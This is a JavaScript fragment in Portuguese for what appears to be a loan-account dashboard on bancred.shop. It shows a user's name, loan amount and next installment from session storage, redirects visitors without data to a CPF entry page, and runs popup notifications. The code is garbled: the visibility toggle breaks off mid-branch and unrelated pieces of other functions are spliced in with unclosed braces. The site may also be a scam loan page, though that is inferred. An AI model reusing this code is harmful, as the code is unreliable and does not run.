<script>
    // Função helper para detectar ambiente e construir URLs
    function getLocalUrl(path) {
        const isLocal = window.location.hostname === 'localhost' || 
                      window.location.hostname === '127.0.0.1' ||
                      window.location.protocol === 'file:';
        
        if (isLocal) {
            const currentPath = window.location.pathname;
            const basePath = currentPath.substring(0, currentPath.lastIndexOf('/'));
            const cleanPath = path.startsWith('/') ? path.substring(1) : path;
            return window.location.origin + basePath + '/' + cleanPath;
        } else {
            return "https://bancred.shop" + (path.startsWith('/') ? path : '/' + path);
        }
    }
    
    const userLogado = sessionStorage.getItem("userData");
    if (!userLogado) {
        window.location.href = getLocalUrl('/cpf.html') + window.location.search;
    }
    // Variáveis para armazenar valores originais
    let originalValues = {
        loanAmount: "",
        loanAmount2: "",
        nextPayment: ""
    };

    let isBalanceVisible = true;

    $(document).ready(function () {
        const userData = JSON.parse(sessionStorage.getItem("userData") || "{}");

        let userName = (userData?.NOME || userData?.nome || "Usuário").split(" ")[0];
        let loanAmount = userData?.valorDesejado || 20000;
        let monthlyPayment = userData?.valorParcela || 469.7;
        let nextPaymentDate = userData?.proxVencimento || "25/02/2026";

        $("#userName").text(userName);

        const formattedLoanAmount = "R$ " + loanAmount.toLocaleString("pt-BR", {minimumFractionDigits: 2,maximumFractionDigits: 2,});
        const formattedNextPayment = nextPaymentDate + " - R$ " + monthlyPayment.toLocaleString("pt-BR", {minimumFractionDigits: 2,maximumFractionDigits: 2,});

        // Armazenar valores originais
        originalValues.loanAmount = formattedLoanAmount;
        originalValues.loanAmount2 = formattedLoanAmount;
        originalValues.nextPayment = formattedNextPayment;

        // Exibir valores
        $("#loanAmount").text(formattedLoanAmount);
        $("#loanAmount2").text(formattedLoanAmount);
        $("#nextPayment").text(formattedNextPayment);
    });

    function toggleBalanceVisibility() {
        const eyeIcon = document.getElementById('eyeIcon');
        
        if (isBalanceVisible) {
            // Ocultar valores
            $("#loanAmount").text("R$ ••••••");
            $("#loanAmount2").text("R$ ••••••");
            $("#nextPayment").text("••/••/•••• - R$ •••,••");
            
            // Trocar ícone para eye-off (olho com linha)
            eyeIcon.innerHTML = '<path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"></path><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"></path><path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"></path><line x1="2" y1="2" x2="22" y2="22"></line>';
            eyeIcon.setAttribute('class', 'lucide lucide-eye-off w-5 h-5 md:h-6 md:w-6 text-white');
            
            isBalanceVisible = false;
        } else {

    function formatCurrencyNoti(value) {
        return value.toLocaleString("pt-BR", {

        const n = notifications[currentNotification];

        container.classList.remove("translate-y-full", "opacity-0");
        container.classList.add("translate-y-0", "opacity-100");

        progressEl.style.transition = "none";
        progressEl.style.width = "100%";
        void progressEl.offsetWidth;

        progressEl.style.transition = "width 5s linear";
        progressEl.style.width = "0%";

        setTimeout(() => {
            container.classList.add("translate-y-full", "opacity-0");
